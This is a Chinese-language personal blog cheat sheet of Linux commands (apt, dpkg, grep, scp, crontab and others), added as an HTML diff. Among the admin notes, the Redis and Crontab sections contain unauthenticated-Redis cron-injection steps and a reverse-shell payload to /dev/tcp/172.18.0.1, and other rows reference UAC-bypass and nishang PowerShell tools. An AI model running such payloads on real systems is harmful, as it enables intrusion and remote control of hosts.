@@ -1,0 +1,1437 @@
+<!DOCTYPE html>
+
+
+
+
+
+<html class="theme-next gemini use-motion" lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="generator" content="Hexo 3.9.0">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/128x128.ico?v=7.3.0">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/128x128.ico?v=7.3.0">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/128x128.ico?v=7.3.0">
+  <meta name="google-site-verification" content="GGFme5OaJm26Z2TDjB--Ol2pfQANqnR69mkuVsw70rU">
+
+<link rel="stylesheet" href="/css/main.css?v=7.3.0">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/font-awesome.min.css?v=4.7.0">
+  <link rel="stylesheet" href="/lib/fancybox/source/jquery.fancybox.css">
+  <script src="/lib/pace/pace.min.js?v=1.0.2"></script>
+  <link rel="stylesheet" href="/lib/pace/pace-theme-minimal.min.css?v=1.0.2">
+
+
+<script id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Gemini',
+    version: '7.3.0',
+    sidebar: {"position":"left","display":"post","offset":12,"onmobile":false},
+    back2top: {"enable":true,"sidebar":true,"scrollpercent":true},
+    copycode: {"enable":true,"show_result":true,"style":null},
+    fancybox: true,
+    mediumzoom: false,
+    lazyload: false,
+    pangu: false,
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    },
+    localsearch: {"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},
+    search: {
+      root: '/',
+      path: 'search.xml'
+    },
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    translation: {
+      copy_button: 'copy',
+      copy_success: 'succeed',
+      copy_failure: 'failed'
+    }
+  };
+</script>
+
+  <meta name="description" content="Ruby安装ruby Lsof    lsof   /path/to/file 找出谁在使用某个文件    lsof   /path/to/file1 /path/to/file2 一次制定多个文件   lsof   -u pkrumins 列出某个用户打开的所有文件   lsof   -u pkrumins -c apache 列出所有由某个用户或某个进程打开的文件   lsof   -p 45">
+<meta name="keywords" content="奇技淫巧,Linux命令">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Linux命令">
+<meta property="og:url" content="https://wh0ale.github.io/2018/12/08/2018-12-08-Linux命令/index.html">
+<meta property="og:site_name" content="Wh0ale&#39;s Blog">
+<meta property="og:description" content="Ruby安装ruby Lsof    lsof   /path/to/file 找出谁在使用某个文件    lsof   /path/to/file1 /path/to/file2 一次制定多个文件   lsof   -u pkrumins 列出某个用户打开的所有文件   lsof   -u pkrumins -c apache 列出所有由某个用户或某个进程打开的文件   lsof   -p 45">
+<meta property="og:locale" content="zh-CN">
+<meta property="og:image" content="https://pic3.zhimg.com/v2-2a47d453927495608ee41086f64d4ca1_b.jpg">
+<meta property="og:updated_time" content="2019-09-06T06:03:19.294Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="Linux命令">
+<meta name="twitter:description" content="Ruby安装ruby Lsof    lsof   /path/to/file 找出谁在使用某个文件    lsof   /path/to/file1 /path/to/file2 一次制定多个文件   lsof   -u pkrumins 列出某个用户打开的所有文件   lsof   -u pkrumins -c apache 列出所有由某个用户或某个进程打开的文件   lsof   -p 45">
+<meta name="twitter:image" content="https://pic3.zhimg.com/v2-2a47d453927495608ee41086f64d4ca1_b.jpg">
+  <link rel="alternate" href="/atom.xml" title="Wh0ale's Blog" type="application/atom+xml">
+  <link rel="canonical" href="https://wh0ale.github.io/2018/12/08/2018-12-08-Linux命令/">
+
+
+<script id="page.configurations">
+  CONFIG.page = {
+    sidebar: "",
+  };
+</script>
+
+  <title>Linux命令 | Wh0ale's Blog</title>
+  
+
+
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .motion-element,
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-title { opacity: initial; }
+
+  .use-motion .logo,
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-CN">
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta">
+
+    <div class="custom-logo-site-title">
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">Wh0ale's Blog</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+  </div>
+
+  <div class="site-nav-toggle">
+    <button aria-label="切换导航栏">
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+    <ul id="menu" class="menu">
+        
+        
+        
+          
+          <li class="menu-item menu-item-home">
+      
+    
+
+    <a href="/" rel="section"><i class="menu-item-icon fa fa-fw fa-home"></i> <br>首页</a>
+
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-about">
+      
+    
+
+    <a href="/about/" rel="section"><i class="menu-item-icon fa fa-fw fa-user"></i> <br>关于</a>
+
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-tags">
+      
+    
+
+    <a href="/tags/" rel="section"><i class="menu-item-icon fa fa-fw fa-tags"></i> <br>标签</a>
+
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-categories">
+      
+    
+
+    <a href="/categories/" rel="section"><i class="menu-item-icon fa fa-fw fa-th"></i> <br>分类</a>
+
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-archives">
+      
+    
+
+    <a href="/archives/" rel="section"><i class="menu-item-icon fa fa-fw fa-archive"></i> <br>归档</a>
+
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-sitemap">
+      
+    
+
+    <a href="/sitemap.xml" rel="section"><i class="menu-item-icon fa fa-fw fa-sitemap"></i> <br>站点地图</a>
+
+  </li>
+        <li class="menu-item menu-item-search">
+          <a href="javascript:;" class="popup-trigger">
+          
+            <i class="menu-item-icon fa fa-search fa-fw"></i> <br>搜索</a>
+        </li>
+      
+    </ul>
+    <div class="site-search">
+      
+  <div class="popup search-popup local-search-popup">
+  <div class="local-search-header clearfix">
+    <span class="search-icon">
+      <i class="fa fa-search"></i>
+    </span>
+    <span class="popup-btn-close">
+      <i class="fa fa-times-circle"></i>
+    </span>
+    <div class="local-search-input-wrapper">
+      <input autocomplete="off"
+             placeholder="搜索..." spellcheck="false"
+             type="text" id="local-search-input">
+    </div>
+  </div>
+  <div id="local-search-result"></div>
+</div>
+
+
+    </div>
+</nav>
+
+</div>
+    </header>
+
+    
+
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+            
+
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+    <div class="reading-progress-bar"></div>
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="https://wh0ale.github.io/2018/12/08/2018-12-08-Linux命令/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Wh0ale">
+      <meta itemprop="description" content="No master and rookie，only hardworking and lazy.">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Wh0ale's Blog">
+    </span>
+      <header class="post-header">
+
+        
+          <h1 class="post-title" itemprop="name headline">Linux命令
+
+              
+            
+          </h1>
+        
+
+        <div class="post-meta">
+        
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+
+              
+                
+              
+
+              <time title="创建时间：2018-12-08 00:00:00" itemprop="dateCreated datePublished" datetime="2018-12-08T00:00:00+08:00">2018-12-08</time>
+            </span>
+          
+            
+
+            
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-calendar-check-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">更新于</span>
+                
+                <time title="修改时间：2019-09-06 14:03:19" itemprop="dateModified" datetime="2019-09-06T14:03:19+08:00">2019-09-06</time>
+              </span>
+            
+          
+
+          
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon"
+              >
+                <i class="fa fa-eye"></i>
+                 阅读次数： 
+                <span class="busuanzi-value" id="busuanzi_value_page_pv"></span>
+              </span>
+            </span>
+          <br>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-file-word-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">本文字数：</span>
+              
+              <span title="本文字数">11k</span>
+            </span>
+          
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-clock-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">阅读时长 &asymp;</span>
+              
+              <span title="阅读时长">10 分钟</span>
+            </span>
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+
+
+      
+        <h1 id="Ruby"><a href="#Ruby" class="headerlink" title="Ruby"></a>Ruby</h1><p><a href="https://www.linuxidc.com/Linux/2015-03/114450.htm" target="_blank" rel="noopener">安装ruby</a></p>
+<p>Lsof</p>
+<table>
+<thead>
+<tr>
+<th>lsof   /path/to/file</th>
+<th>找出谁在使用某个文件</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>lsof   /path/to/file1 /path/to/file2</td>
+<td>一次制定多个文件</td>
+</tr>
+<tr>
+<td>lsof   -u pkrumins</td>
+<td>列出某个用户打开的所有文件</td>
+</tr>
+<tr>
+<td>lsof   -u pkrumins -c apache</td>
+<td>列出所有由某个用户或某个进程打开的文件</td>
+</tr>
+<tr>
+<td>lsof   -p 450,980,333</td>
+<td>列出所有由某个PID对应的进程打开的文件</td>
+</tr>
+<tr>
+<td>lsof   -i</td>
+<td>列出所有网络连接</td>
+</tr>
+</tbody></table>
+<h1 id="用户权限"><a href="#用户权限" class="headerlink" title="用户权限"></a>用户权限</h1><p>-rwxrw-r‐-1 root root 1213 Feb 2 09:39 abc</p>
+<p>- 其余字符每3个一组（rwx），读（r）、写（w）、执行（x）</p>
+<p>- 第一组rwx：文件所有者的权限是读、写和执行</p>
+<p>- 第二组rw-：与文件所有者同一组的用户的权限是读、写但不能执行</p>
+<p>- 第三组r--：不与文件所有者同组的其他用户的权限是读不能写和执行</p>
+<p>- usermod ‐g 组名 用户名</p>
+<p>- usermod ‐d 目录名 用户名，改变该用户登录的初始目录</p>
+<h1 id="Sed"><a href="#Sed" class="headerlink" title="Sed"></a>Sed</h1><p>sed -i &#39;s#/var/log/*.log#/var/log/apache2/access.log#g&#39; /etc/filebeat/filebeat.yml</p>
+<h1 id="Nc"><a href="#Nc" class="headerlink" title="Nc"></a>Nc</h1><p>-g&lt;网关&gt;：设置路由器跃程通信网关，最多设置8个；</p>
+<p>-G&lt;指向器数目&gt;：设置来源路由指向器，其数值为4的倍数；</p>
+<p>-h：在线帮助；</p>
+<p>-i&lt;延迟秒数&gt;：设置时间间隔，以便传送信息及扫描通信端口；</p>
+<p>-l：使用监听模式，监控传入的资料；</p>
+<p>-n：直接使用ip地址，而不通过域名服务器；</p>
+<p>-o&lt;输出文件&gt;：指定文件名称，把往来传输的数据以16进制字码倾倒成该文件保存；</p>
+<p>-p&lt;通信端口&gt;：设置本地主机使用的通信端口；</p>
+<p>-r：指定源端口和目的端口都进行随机的选择；</p>
+<p>-s&lt;来源位址&gt;：设置本地主机送出数据包的IP地址；</p>
+<p>-u：使用UDP传输协议；</p>
+<p>-v：显示指令执行过程；</p>
+<p>-w&lt;超时秒数&gt;：设置等待连线的时间；</p>
+<p>-z：使用0输入/输出模式，只在扫描通信端口时使用。</p>
+<h1 id="Bundle"><a href="#Bundle" class="headerlink" title="Bundle"></a>Bundle</h1><table>
+<thead>
+<tr>
+<th>bundle   show</th>
+<th>显示所有的依赖包</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>bundle   show [gemname]</td>
+<td>显示指定gem包的安装位置</td>
+</tr>
+<tr>
+<td>bundle   check</td>
+<td>检查系统中缺少那些项目以来的gem包</td>
+</tr>
+<tr>
+<td>bundle   install</td>
+<td>安装项目依赖的所有gem包</td>
+</tr>
+<tr>
+<td>bundle   install [gemname]</td>
+<td>安装指定的gem包</td>
+</tr>
+<tr>
+<td>bundle   update</td>
+<td>更新系统中存在的项目依赖包，并同时更新项目Gemfile.lock文件</td>
+</tr>
+<tr>
+<td>gem   [gemname], [ver]</td>
+<td>向项目中添加新的gem包引用</td>
+</tr>
+<tr>
+<td>bundle   lock</td>
+<td>使用bundle   lock来锁定当前环境，这样便不能通过bundle update来更新依赖包的版本，保证了统一的环境</td>
+</tr>
+<tr>
+<td>bundle   unlock</td>
+<td>解除锁定</td>
+</tr>
+<tr>
+<td></td>
+<td></td>
+</tr>
+</tbody></table>
+<h1 id="文件目录"><a href="#文件目录" class="headerlink" title="文件目录"></a>文件目录</h1><p>./Tools 表示查找某个文件</p>
+<p>.代表当前目录的意思   ./Tools/cobaltstrike</p>
+<p>/代表根目录的意思</p>
+<p>windows下 不分/和＼  但是\有转义的意思，有时候再linux下面查找路径需要用&quot;c:\<strong><em>\</em></strong>\***&quot;   有空格需要用双引号</p>
+<p>powershell下面 . .\需要执行的powershell文件</p>
+<table>
+<thead>
+<tr>
+<th>.代表执行  后一个点是当前目录的意思</th>
+<th>PS   F:\PowerShell-Suite-master\Bypass-UAC&gt; . .\Bypass-UAC.ps1</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>导入模块</td>
+<td>Import-Module   ./nishang.psm1</td>
+</tr>
+<tr>
+<td>导入文件</td>
+<td>.   .\Bypass-UAC.ps1</td>
+</tr>
+<tr>
+<td>查询策略</td>
+<td>Get-ExecutionPolicy</td>
+</tr>
+<tr>
+<td>设置策略</td>
+<td>set-executionpolicy   remotesigned</td>
+</tr>
+<tr>
+<td>查询模块信息</td>
+<td>PS   F:\nishang-master&gt; Get-ExecutionPolicy</td>
+</tr>
+<tr>
+<td>查看帮助</td>
+<td>get-help   Get-Information</td>
+</tr>
+<tr>
+<td># History</td>
+<td></td>
+</tr>
+</tbody></table>
+<p>存在.bash_history（或者说root/bash_history）</p>
+<table>
+<thead>
+<tr>
+<th>history   N</th>
+<th>显示最近的N条命令，例如history   5</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>history   -d N</td>
+<td>删除第N条命令，这个N就是前面的编号，例如history   -d 990</td>
+</tr>
+<tr>
+<td>history   -c</td>
+<td>清空命令历史</td>
+</tr>
+<tr>
+<td>history   -a</td>
+<td>将当前会话中的命令历史写入指定文件</td>
+</tr>
+<tr>
+<td>echo   $HISTFILE</td>
+<td>使用此命令查看环境变量</td>
+</tr>
+<tr>
+<td>history   | grep cd</td>
+<td></td>
+</tr>
+<tr>
+<td>Ctrl+ R</td>
+<td>快速搜索</td>
+</tr>
+</tbody></table>
+<p>#</p>
+<h1 id="复制文件"><a href="#复制文件" class="headerlink" title="复制文件"></a>复制文件</h1><p>Cp 文件名 /**/目录/新文件名</p>
+<h1 id="Redis"><a href="#Redis" class="headerlink" title="Redis"></a>Redis</h1><table>
+<thead>
+<tr>
+<th>ps   aux|grep redis</th>
+<th>查看redis服务</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>kill   -9 12281</td>
+<td>kill服务</td>
+</tr>
+<tr>
+<td>sudo   /etc/init.d/redis-server restart</td>
+<td>重启Redis服务器</td>
+</tr>
+<tr>
+<td>config get dir</td>
+<td>获取dir的值</td>
+</tr>
+<tr>
+<td>config get dbfilename</td>
+<td>获取dbfilename的值</td>
+</tr>
+<tr>
+<td>config set dbfilename &#39;root&#39;</td>
+<td>设置备份文件名为root，以root身份执行计划任务</td>
+</tr>
+<tr>
+<td>flushall</td>
+<td>删除所有数据库的所有key</td>
+</tr>
+<tr>
+<td>del   cron</td>
+<td>删除新增的key</td>
+</tr>
+</tbody></table>
+<h1 id="Crontab"><a href="#Crontab" class="headerlink" title="Crontab"></a>Crontab</h1><p>set 1 &quot;\n\n\n\n* * * * * root bash -i &gt;&amp; /dev/tcp/172.18.0.1/21 0&gt;&amp;1\n\n\n\n&quot;</p>
+<table>
+<thead>
+<tr>
+<th>crontab -l</th>
+<th>列出crontab文件</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>crontab -e</td>
+<td>编辑crontab文件</td>
+</tr>
+<tr>
+<td>service crond status</td>
+<td>查看crontab服务状态</td>
+</tr>
+<tr>
+<td>service crond start</td>
+<td>手动启动crontab服务</td>
+</tr>
+<tr>
+<td>30 21 * * * /etc/init.d/smb restart</td>
+<td>每晚的21:30重启smb</td>
+</tr>
+<tr>
+<td>30 21 1,10,22 * * /etc/init.d/smb restart</td>
+<td>每月1、10、22日的21:30重启smb</td>
+</tr>
+<tr>
+<td>10 1 * * 6,0 /etc/init.d/smb restart</td>
+<td>每周六、周日的1 : 10重启smb</td>
+</tr>
+<tr>
+<td>* * * * * command</td>
+<td>每1分钟执行一次command</td>
+</tr>
+<tr>
+<td>/var/spool/cron/root</td>
+<td>centos系统下root用户的cron文件\</td>
+</tr>
+<tr>
+<td>/var/spool/cron/crontabs/root</td>
+<td>debian系统下root用户的cron文件\</td>
+</tr>
+</tbody></table>
+<h1 id="ssh服务"><a href="#ssh服务" class="headerlink" title="ssh服务"></a>ssh服务</h1><p>sudo rm /var/cache/apt/archives/lock</p>
+<p>sudo rm /var/lib/dpkg/lock</p>
+<p>/etc/init.d/ssh start 开启ssh</p>
+<p>service sshd restart</p>
+<p>ssh-keygen -R &quot;你的远程服务器ip地址&quot;  清除你当前机器里关于你的远程服务器的缓存和公钥信息</p>
+<p>位数</p>
+<p>Uname -m    i686、i386是32bit</p>
+<p>file /lib/systemd/systemd</p>
+<p>Arch</p>
+<p>getconf LONG_BIT</p>
+<h1 id="Grep"><a href="#Grep" class="headerlink" title="Grep"></a>Grep</h1><p>ps -e | grep sshd</p>
+<p>[root@www ~]# grep [-acinv] [--color=auto] &#39;搜寻字符串&#39; filename</p>
+<p>选项与参数：</p>
+<p>-a ：将 binary 文件以 text 文件的方式搜寻数据</p>
+<p>-c ：计算找到 &#39;搜寻字符串&#39; 的次数</p>
+<p>-i ：忽略大小写的不同，所以大小写视为相同</p>
+<p>-n ：顺便输出行号</p>
+<p>-v ：反向选择，亦即显示出没有 &#39;搜寻字符串&#39; 内容的那一行！</p>
+<p>--color=auto ：可以将找到的关键词部分加上颜色的显示喔！</p>
+<p># grep root /etc/passwd</p>
+<p>root:x:0:0:root:/root:/bin/bash</p>
+<p>operator:x:11:0:operator:/root:/sbin/nologin</p>
+<p>或</p>
+<p># cat /etc/passwd | grep root</p>
+<p>root:x:0:0:root:/root:/bin/bash</p>
+<p>operator:x:11:0:operator:/root:/sbin/nologin</p>
+<h1 id="dpkg"><a href="#dpkg" class="headerlink" title="dpkg"></a>dpkg</h1><p>dpkg -i netease-cloud-music_1.0.0_amd64_ubuntu14.04.deb #安装包</p>
+<p>dpkg -r netease-cloud-music #删除包</p>
+<p>dpkg -P netease-cloud-music #删除包（包括配置文件）</p>
+<p>dpkg -L netease-cloud-music #列出与该包关联的文件</p>
+<p>dpkg -l netease-cloud-music #显示该包的版本</p>
+<p>dpkg --unpack netease-cloud-music_1.0.0_amd64_ubuntu14.04.deb #解开deb包的内容</p>
+<p>dpkg -S keyword #搜索所属的包内容</p>
+<p>dpkg -l #列出当前已安装的包</p>
+<p>dpkg -c netease-cloud-music_1.0.0_amd64_ubuntu14.04.deb #列出deb包的内容</p>
+<p>dpkg --configure netease-cloud-music #配置包</p>
+<p>：</p>
+<h1 id="SCP"><a href="#SCP" class="headerlink" title="SCP"></a>SCP</h1><p>scp /mnt/sda1/cc.txt <a href="mailto:root@192.168.99.134" target="_blank" rel="noopener">root@192.168.99.134</a>:/root/test12/translate-shell/man</p>
+<p>scp -r local_folder remote_username@remote_ip:remote_folder</p>
+<p>或者</p>
+<p>scp -r local_folder remote_ip:remote_folder</p>
+<p>第1个指定了用户名，命令执行后需要输入用户密码；</p>
+<p>第2个没有指定用户名，命令执行后需要输入用户名和密码</p>
+<h1 id="关机命令："><a href="#关机命令：" class="headerlink" title="关机命令："></a>关机命令：</h1><p>1、halt 立刻关机</p>
+<p>2、poweroff 立刻关机</p>
+<p>3、shutdown -h now 立刻关机(root用户使用)</p>
+<p>4、shutdown -h 10 10分钟后自动关机 如果是通过shutdown命令设置关机的话，可以用shutdown -c命令取消重启</p>
+<h1 id="重启命令："><a href="#重启命令：" class="headerlink" title="重启命令："></a>重启命令：</h1><p>1、reboot</p>
+<p>2、shutdown -r now 立刻重启(root用户使用)</p>
+<p>3、shutdown -r 10 过10分钟自动重启(root用户使用)</p>
+<p>4、shutdown -r 20:35 在时间为20:35时候重启(root用户使用) 如果是通过shutdown命令设置重启的话，可以用shutdown -c命令取消重启</p>
+<h1 id="桌面安装"><a href="#桌面安装" class="headerlink" title="桌面安装"></a>桌面安装</h1><p>输入sudo  -i，密码，切换成了root，开始安装桌面环境了。</p>
+<p>apt-get  install  xinit，要启动startx必须得先安装xinit。安装完桌面变了一点，但只不过变成了白色页面，真正的桌面环境还没安。</p>
+<p>apt-get install gdm之后安装环境管理器(desk manager)Gnome 或者 Kde.这里我安的是gnome：apt-get install gdm，（KDE：kdm  //  Xface : xdm）.</p>
+<p>apt-get  install  ubuntu-desktop安装桌面环境，安装完全部的桌面环境的代价（解压完占1个多G的空间）还是比较大的（相对于这20GB的硬盘），因为安装桌面相关软件太多（这里我先安全环境，后期我会试着把多余的软件甚至桌面环境卸载，毕竟是服务器嘛）。apt-get  install  ubuntu-desktop，安装好。（还可以安装xubun-desktop，kubuntu-desktop）</p>
+<p>这里假如你不想要某个桌面系统想换一个，你可以执行如下指令卸载：（假设为xubuntu）</p>
+<p>1.apt-get  remove  xubuntu* 　(卸载相关的软件，但是记住这个会保存配置文件，要想删除配置文件加上选项：--purge   (清除的意思)　)</p>
+<p>2.apt-get  autoremove 　 (删除为了满足其他软件包的依赖而安装的，但当前不再需要的包)</p>
+<p>3.apt-get  clean　　(系统清理，它删除包缓存中的所有包，没事就看可以清理一下)</p>
+<p>最后重启服务器，就是熟悉的界面了</p>
+<h1 id="桌面美化"><a href="#桌面美化" class="headerlink" title="桌面美化"></a>桌面美化</h1><p>sudo dpkg-reconfigure gdm3  （选择LightDM和GDM登录显示器）</p>
+<p>1、sudo apt-get install xinit</p>
+<p>2、sudo apt-get install gdm</p>
+<p>3、sudo apt-get install ubuntu-desktop</p>
+<p># 如果执行过方案b，这里执行完第三步会出现一个选择，我选了第一项很丑（随便选的），你可以选第二个</p>
+<p>2、自定义安装桌面</p>
+<p>1）安装x－windows的基础（必须）</p>
+<p># sudo apt-get install x-window-system-core</p>
+<p>2）安装gnome基础（必须）</p>
+<p># sudo apt-get install gnome-core</p>
+<p>3）安装中文显示(建议安装）</p>
+<p># sudo apt-get install language-pack-gnome-zh  ——&gt;让gnome面板、菜单显示中文</p>
+<p>#sudo apt-get install language-pack-gnome-zh-base sudo apt-get install language-pack-zh    ——&gt;中文语言包</p>
+<p># sudo apt-get install language-pack-zh-base sudo apt-get install language-support-zh       ——&gt;中文语言支持</p>
+<p># sudo apt-get install scim      ——&gt; scim中文输入法平台</p>
+<p>4）安装登录管理器（一般可以不选）</p>
+<p># sudo apt-get install gdm</p>
+<p>说明：  gdm（gnome display manager）即gnome图形界面显示管理器，还有kdm/xdm等，它将使您可以在启动时直接进入GUI桌面环境，而勿需通过 startx 来启动GUI。</p>
+<p>5）安装新利得软件管理器（可选）</p>
+<p>#  sudo apt-get install synaptic</p>
+<p>6）卸载gnome桌面环境</p>
+<p># sudo apt-get –purge remove liborbit2</p>
+<p>7）进入图形界面：#startx</p>
+<p>8）退出图形桌面：#ctrl + alt + backspace</p>
+<h1 id="查找"><a href="#查找" class="headerlink" title="查找"></a>查找</h1><p><a href="http://man.linuxde.net/find" target="_blank" rel="noopener">find</a> . -name &quot;*.c&quot;</p>
+<p>find / -name &quot;redis.conf&quot;</p>
+<p>find /home -name &quot;*.txt&quot; 在/home目录下查找以.txt结尾的文件名</p>
+<p>find . -type 类型参数 根据文件类型进行搜索</p>
+<h1 id="重启网络"><a href="#重启网络" class="headerlink" title="重启网络"></a>重启网络</h1><p>root@kali:/etc/init.d# service networking restart</p>
+<p>root@kali:/etc/init.d#</p>
+<h1 id="Alias"><a href="#Alias" class="headerlink" title="Alias"></a>Alias</h1><p>Alias kali=ssh <a href="mailto:root@192.168.164.129" target="_blank" rel="noopener">root@192.168.164.129</a></p>
+<h1 id="删除软件"><a href="#删除软件" class="headerlink" title="删除软件"></a>删除软件</h1><p>rm -r <directory-name> 刪除文件夾</directory-name></p>
+<p>mkdir -m 700 /usr/meng/test   只有文件主有读、写和执行权限，其他人无权访问</p>
+<p>mv ex3 new1      将文件ex3改名为new1</p>
+<p>mv /usr/men/* .   /usr/men中的所有文件移到当前目录</p>
+<p>unalias cc   使用unalias命令将已经设置的命令别名&quot;cc&quot;取消</p>
+<h1 id="网络服务"><a href="#网络服务" class="headerlink" title="网络服务"></a>网络服务</h1><p>/etc/init.d/iptables stop    关闭防火墙</p>
+<p>iptables -I INPUT -p TCP --dport 80 -j ACCEPT 把tcp的80端口设置成允许任何IP都可以访问</p>
+<p>/etc/init.d/apache2 start</p>
+<p>service apache2 start 重启apache2服务器</p>
+<p>apt-get clean&amp;&amp;apt-get autoremove 清除kali垃圾</p>
+<p>chmod   a+x   文件名   提升权限的操作</p>
+<p>sudo -s 获取最高权限</p>
+<h1 id="更新源"><a href="#更新源" class="headerlink" title="更新源"></a>更新源</h1><p>#官方更新源</p>
+<p>deb <a href="http://http.kali.org/kali" target="_blank" rel="noopener">http://http.kali.org/kali</a> kali-rolling main non-free contrib</p>
+<p>deb-src <a href="http://http.kali.org/kali" target="_blank" rel="noopener">http://http.kali.org/kali</a> kali-rolling main non-free contrib</p>
+<p># 中科大</p>
+<p>deb <a href="https://mirrors.ustc.edu.cn/kali" target="_blank" rel="noopener">https://mirrors.ustc.edu.cn/kali</a> kali-rolling main non-free contrib</p>
+<p>deb-src <a href="https://mirrors.ustc.edu.cn/kali" target="_blank" rel="noopener">https://mirrors.ustc.edu.cn/kali</a> kali-rolling main non-free contrib</p>
+<p>#官方更新源</p>
+<p>deb <a href="http://http.kali.org/kali" target="_blank" rel="noopener">http://http.kali.org/kali</a> kali-rolling main non-free contrib</p>
+<p>#中科大的源</p>
+<p>deb <a href="http://mirrors.ustc.edu.cn/kali" target="_blank" rel="noopener">http://mirrors.ustc.edu.cn/kali</a> kali-rolling main non-free contrib</p>
+<p>deb <a href="http://us.archive.ubuntu.com/ubuntu" target="_blank" rel="noopener">http://us.archive.ubuntu.com/ubuntu</a> trusty main universe</p>
+<h1 id="更新命令"><a href="#更新命令" class="headerlink" title="更新命令"></a>更新命令</h1><p>apt-get update //更新软件列表</p>
+<p>apt-get update --fix-missing //更新异常索引文件</p>
+<p>apt-get upgrade //更新软件</p>
+<p>apt-get dist-upgrade //更新系统版本</p>
+<h1 id="卸载"><a href="#卸载" class="headerlink" title="卸载"></a>卸载</h1><p>apt-get purge           软件名   建议卸载时候使用该命令<br>apt-get remove        软件名 　　删除相应的软件（实际上删除了 /var/cache/apt/archives 目录下所有以deb 文件）<br>apt-get purge           软件名   删除相关软件，同时删除该软件的配置文件<br>apt-get clean            把存储的安装包全部卸载<br>apt-get autoremove 　自动清理无用的meta package</p>
+<h1 id="查看内核"><a href="#查看内核" class="headerlink" title="查看内核"></a>查看内核</h1><p>dpkg --get-selections|grep linux 查看内核 有image的就是内核文件</p>
+<p>sudo apt-get remove 内核文件名 删除老的内核文件</p>
+<p>uname -a 当前内核</p>
+<p>/var/cache/apt/archives 包管理的临时文件目录:</p>
+<p>/var/cache/apt/archives/partial 没有下载完的目录</p>
+<h1 id="清理命令："><a href="#清理命令：" class="headerlink" title="清理命令："></a>清理命令：</h1><p>sudo apt-get autoclean 清理旧版本的软件缓存</p>
+<p>sudo apt-get clean 清理所有软件缓存</p>
+<p>sudo apt-get autoremove 删除系统不再使用的孤立软件</p>
+<p>sudo apt-get install deborphan -y 清理Linux下孤立的包</p>
+<p>sudo apt-get remove --purge 软件名</p>
+<p>dpkg -l |grep ^rc|awk &#39;{print $2}&#39; |sudo xargs dpkg -P 清除残余的配置文件保证干净</p>
+<p>sync; echo 1 &gt; /proc/sys/vm/drop_caches   仅清除页面缓存（PageCache）</p>
+<p>sync; echo 2 &gt; /proc/sys/vm/drop_caches   清除目录项和inode</p>
+<p>sync; echo 3 &gt; /proc/sys/vm/drop_caches   清除页面缓存，目录项和inode</p>
+<p>free -m</p>
+<p>total——总物理内存</p>
